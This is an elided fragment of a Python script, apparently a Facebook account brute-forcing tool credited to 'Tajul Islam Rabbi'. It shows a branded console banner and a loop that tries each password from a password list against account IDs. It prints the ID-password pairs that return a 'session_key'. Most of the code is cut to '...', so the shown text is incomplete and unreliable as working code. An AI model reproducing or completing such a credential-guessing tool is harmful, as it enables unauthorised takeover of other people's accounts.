#WRITTEN BY Tajul Islam Rabbi
#FOLLOW : https://github.com/Hacker1414
#------------- import -------------#
import os
...
{warna}--------------------------------------------{B}
 ...
 Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}TRAIL{warna}]{warna}Tajul Islam Rabbi
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
...
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/Hacker1414')
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                print('\r\r \033[1;30m[RABBI-CP] '+ids+' | '+pas+'\033[1;37m')
